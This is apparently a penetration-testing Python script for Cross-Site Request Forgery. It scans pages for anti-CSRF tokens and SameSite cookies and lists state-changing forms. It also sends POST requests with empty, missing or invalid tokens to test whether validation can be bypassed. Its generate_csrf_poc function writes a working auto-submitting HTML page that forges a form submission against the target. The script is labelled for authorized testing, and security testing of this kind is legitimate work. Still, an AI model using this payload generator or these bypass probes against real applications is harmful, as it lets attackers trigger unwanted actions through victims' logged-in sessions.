#!/usr/bin/env python3
"""
CSRF Attack Simulation Agent — AUTHORIZED TESTING ONLY
Tests web applications for Cross-Site Request Forgery vulnerabilities by
analyzing anti-CSRF protections and generating proof-of-concept payloads.

WARNING: Only use with explicit written authorization for the target application.
"""

import json
import re
import sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs

import requests
from requests.cookies import RequestsCookieJar


def analyze_csrf_protections(url: str, session: requests.Session = None) -> dict:
    """Analyze a page for CSRF protection mechanisms."""
    if session is None:
        session = requests.Session()

    try:
        resp = session.get(url, timeout=15)
    except requests.RequestException as e:
        return {"url": url, "error": str(e)}

    result = {
        "url": url,
        "status_code": resp.status_code,
        "csrf_tokens_found": [],
        "samesite_cookies": [],
        "custom_headers_required": False,
        "protections": [],
        "vulnerable": True,
    }

    token_patterns = [
        r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)',
        r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
        r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)',
        r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)',
        r'name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)',
    ]

    for pattern in token_patterns:
        matches = re.findall(pattern, resp.text, re.IGNORECASE)
        if matches:
            result["csrf_tokens_found"].extend(matches)
            result["protections"].append("CSRF token in form")
            result["vulnerable"] = False

    meta_pattern = r'<meta\s+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)'
    meta_matches = re.findall(meta_pattern, resp.text, re.IGNORECASE)
    if meta_matches:
        result["csrf_tokens_found"].extend(meta_matches)
        result["protections"].append("CSRF token in meta tag")
        result["vulnerable"] = False

    for cookie_name, cookie_value in resp.cookies.items():
        cookie_header = resp.headers.get("Set-Cookie", "")
        samesite = "none"
        if "samesite=strict" in cookie_header.lower():
            samesite = "strict"
        elif "samesite=lax" in cookie_header.lower():
            samesite = "lax"

        result["samesite_cookies"].append({
            "name": cookie_name,
            "samesite": samesite,
        })

        if samesite in ("strict", "lax"):
            result["protections"].append(f"SameSite={samesite} cookie: {cookie_name}")

    if "x-csrf-token" in resp.headers.get("vary", "").lower():
        result["custom_headers_required"] = True
        result["protections"].append("Custom X-CSRF-Token header required")
        result["vulnerable"] = False

    return result


def find_state_changing_forms(url: str, session: requests.Session = None) -> list[dict]:
    """Identify forms that perform state-changing actions (POST, PUT, DELETE)."""
    if session is None:
        session = requests.Session()

    resp = session.get(url, timeout=15)
    form_pattern = re.compile(
        r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE
    )
    action_pattern = re.compile(r'action=["\']([^"\']*)', re.IGNORECASE)
    method_pattern = re.compile(r'method=["\']([^"\']*)', re.IGNORECASE)
    input_pattern = re.compile(
        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']*)["\'])?',
        re.IGNORECASE,
    )

    forms = []
    for match in form_pattern.finditer(resp.text):
        form_html = match.group(0)
        action = action_pattern.search(form_html)
        method = method_pattern.search(form_html)
        inputs = input_pattern.findall(form_html)

        method_val = method.group(1).upper() if method else "GET"
        if method_val in ("POST", "PUT", "DELETE", "PATCH"):
            form_data = {
                "action": action.group(1) if action else url,
                "method": method_val,
                "inputs": [{"name": i[0], "type": i[1] or "text"} for i in inputs],
                "has_csrf_token": any(
                    "csrf" in i[0].lower() or "token" in i[0].lower()
                    for i in inputs
                ),
            }
            forms.append(form_data)

    return forms


def generate_csrf_poc(target_url: str, method: str, params: dict, auto_submit: bool = True) -> str:
    """Generate CSRF proof-of-concept HTML page."""
    input_fields = "\n".join(
        f'    <input type="hidden" name="{k}" value="{v}" />'
        for k, v in params.items()
    )

    auto_js = """
    <script>
        document.getElementById('csrf-form').submit();
    </script>""" if auto_submit else ""

    parsed = urlparse(target_url)
    return f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {parsed.hostname}</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Target: {target_url}</p>
    <form id="csrf-form" action="{target_url}" method="{method}">
{input_fields}
        <input type="submit" value="Submit" />
    </form>
    {auto_js}
</body>
</html>"""


def test_csrf_token_validation(url: str, session: requests.Session) -> dict:
    """Test if CSRF token validation can be bypassed."""
    bypass_results = []

    resp = session.get(url, timeout=15)
    token_match = re.search(
        r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)',
        resp.text, re.IGNORECASE,
    )

    if token_match:
        original_token = token_match.group(1)

        test_resp = session.post(url, data={"csrf_token": ""}, timeout=15)
        bypass_results.append({
            "test": "Empty token",
            "status": test_resp.status_code,
            "bypassed": test_resp.status_code < 400,
        })

        test_resp = session.post(url, data={}, timeout=15)
        bypass_results.append({
            "test": "Missing token parameter",
            "status": test_resp.status_code,
            "bypassed": test_resp.status_code < 400,
        })

        test_resp = session.post(url, data={"csrf_token": "invalid_token_value"}, timeout=15)
        bypass_results.append({
            "test": "Invalid token value",
            "status": test_resp.status_code,
            "bypassed": test_resp.status_code < 400,
        })

    return {"url": url, "bypass_tests": bypass_results}


def generate_report(analysis: list[dict], forms: list[dict], bypass: list[dict]) -> str:
    """Generate CSRF testing report."""
    lines = [
        "CSRF ATTACK SIMULATION REPORT — AUTHORIZED TESTING ONLY",
        "=" * 60,
        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        "",
        f"Endpoints Analyzed: {len(analysis)}",
        f"State-Changing Forms: {len(forms)}",
        f"Vulnerable: {sum(1 for a in analysis if a.get('vulnerable', False))}",
        "",
        "ENDPOINT ANALYSIS:",
        "-" * 40,
    ]

    for a in analysis:
        status = "VULNERABLE" if a.get("vulnerable") else "PROTECTED"
        lines.append(f"  [{status}] {a.get('url', 'N/A')}")
        for prot in a.get("protections", []):
            lines.append(f"    Protection: {prot}")

    if forms:
        lines.extend(["", "STATE-CHANGING FORMS:"])
        for f in forms:
            csrf = "YES" if f["has_csrf_token"] else "NO"
            lines.append(f"  {f['method']} {f['action']} (CSRF token: {csrf})")

    return "\n".join(lines)


if __name__ == "__main__":
    print("[!] CSRF ATTACK SIMULATION — AUTHORIZED TESTING ONLY\n")

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [additional_paths...]")
        sys.exit(1)

    target_url = sys.argv[1]
    paths = sys.argv[2:] if len(sys.argv) > 2 else ["/", "/login", "/settings", "/account"]

    session = requests.Session()
    analysis_results = []
    all_forms = []

    for path in paths:
        url = f"{target_url.rstrip('/')}/{path.lstrip('/')}"
        print(f"[*] Analyzing {url}...")
        result = analyze_csrf_protections(url, session)
        analysis_results.append(result)
        forms = find_state_changing_forms(url, session)
        all_forms.extend(forms)

    report = generate_report(analysis_results, all_forms, [])
    print(report)

    vulnerable = [a for a in analysis_results if a.get("vulnerable")]
    if vulnerable:
        poc = generate_csrf_poc(vulnerable[0]["url"], "POST", {"action": "test"})
        with open("csrf_poc.html", "w") as f:
            f.write(poc)
        print("\n[*] PoC saved to csrf_poc.html")
